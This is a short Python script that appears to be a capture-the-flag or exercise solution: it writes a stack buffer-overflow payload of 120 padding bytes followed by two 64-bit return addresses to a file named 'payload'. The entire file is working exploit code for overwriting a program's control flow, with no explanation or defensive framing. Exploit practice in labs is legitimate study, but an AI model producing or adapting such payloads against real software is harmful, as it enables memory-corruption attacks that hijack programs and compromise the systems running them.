#!/usr/bin/env python3

from struct import pack


payload = b'a' * 120
payload += pack("<Q", 0x40197d)
payload += pack("<Q", 0x4019b0)

with open("payload", "wb") as f:
    f.write(payload)
